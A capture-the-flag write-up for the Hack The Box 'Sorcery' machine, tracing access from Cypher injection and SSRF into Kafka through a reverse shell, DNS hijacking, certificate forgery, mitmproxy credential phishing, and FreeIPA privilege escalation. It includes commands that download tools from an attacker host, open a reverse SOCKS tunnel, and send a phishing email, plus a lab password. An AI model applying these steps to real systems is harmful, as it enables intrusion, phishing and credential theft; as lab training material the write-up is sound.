
# 🧙 Sorcery HTB - Full Exploitation Write-Up

---

## 🔍 Full Exploitation Path

---

### **Initial Access via SQLi**
- **Target**: `/dashboard/store/[product_id]`
- **Method**: Cypher injection (NoSQL/GraphQL) to modify admin password
- **Action**: Change admin's password and log in

---

### **Passkey Setup**
- After admin login:
  - Add a passkey (WebAuthn)
  - Log out and log back in using the passkey
- This grants access to `/dashboard/debug`

---

### **SSRF Exploitation**
- Use the debug page's SSRF to interact with internal services
- **Target**: `kafka:9092` (internal message broker)
- **Method**: Push a command as a message to the `update` topic
- **Result**: Get a reverse shell on the DNS service

---

### **DNS Manipulation**
- Once in the DNS container:
  - Modify `/dns/hosts-user` to point your subdomain to attacker IP
  - Use `dnsmasq` to serve malicious DNS responses

---

### **Credential Phishing**
- Use FTP credentials to retrieve Root CA certs
- Set up HTTPS server or `mitmproxy`
- Phish `tom_summers` with fake Gitea login page
- Send phishing link via mail server access

---

### **Privilege Escalation Path**

#### SSH as `tom_summers`
- Check `/xorg/xvfb/Xvfb_screen0` → Image contains password for `tom_summers_admin`

#### Use `sudo` as `tom_summers_admin`
- Sudo access to `strace` on Docker containers as `rebecca_smith`
- Monitor docker login to capture plaintext password

#### SSH as `rebecca_smith`
- pspy64 reveals IPA command with new user `ash_winter`
- Password: `w@LoiU8Crmdep`

#### FreeIPA Privilege Escalation
- `ipa group-add-member sysadmins --users=ash_winter`
- `ipa sudorule-add-user allow_sudo --users=ash_winter`
- `sudo /usr/bin/systemctl restart sssd`
- Then escalate: `sudo su -`

---

## 🧰 Key Commands, Payloads, and Utilities

### **DNS Phishing via Docker Container**
```bash
cd /dns
echo "10.10.XX.XX whatever.sorcery.htb" >> /dns/hosts-user
./convert.sh
pkill -9 dnsmasq
```

### **Upload Chisel**
```python
python3 -c "import urllib.request; open('chisel', 'wb').write(urllib.request.urlopen('http://10.10.XX.XX/chisel').read())"
```

### **Find FTP and Mail Docker IPs**
```bash
getent hosts ftp
getent hosts mail
```

### **Set up Chisel Proxy Tunnel**
```bash
# On victim
./chisel client 10.10.XX.XX:4444 R:socks

# On attacker
./chisel server --port 4444 --reverse --socks5
```

### **Proxychains + Cert Setup**
```bash
nano /etc/proxychains4.conf
# Add at the end
socks5 127.0.0.1 1080

# Retrieve certs
proxychains -q curl ftp://DOCKERFTPIP/pub/RootCA.key -o RootCA.key
proxychains -q curl ftp://DOCKERFTPIP/pub/RootCA.crt -o RootCA.crt

# Create your cert
openssl genrsa -out whatever.sorcery.htb.key 2048
openssl req -new -key whatever.sorcery.htb.key -out whatever.sorcery.htb.csr -subj "/CN=whatever.sorcery.htb"
openssl rsa -in RootCA.key -out RootCA-unenc.key  # Password-protected key
openssl x509 -req -in whatever.sorcery.htb.csr -CA RootCA.crt -CAkey RootCA-unenc.key -CAcreateserial -out whatever.sorcery.htb.crt -days 365
cat whatever.sorcery.htb.key whatever.sorcery.htb.crt > whatever.sorcery.htb.pem
```

### **MITM Proxy & Phishing Email**
```bash
mitmproxy --mode reverse:https://git.sorcery.htb --certs whatever.sorcery.htb.pem --save-stream-file traffic.raw -k -p 443

proxychains -q swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server MAILDOCKERIP --port 1025 --data "Subject: Hello Tom

Hi Tom,

Please check this link: https://root.sorcery.htb/user/login
"
```

---

## 🚪 Root Path (Recap)
```bash
# Login SSH
ssh ash_winter@sorcery.htb

# Change password (expired)

# Add to sysadmins
ipa group-add-member sysadmins --users=ash_winter

# Re-login
ipa sudorule-add-user allow_sudo --users=ash_winter

# Re-login again
sudo /usr/bin/systemctl restart sssd

# Re-login
sudo -l
sudo su -
cat /root/root.txt
```
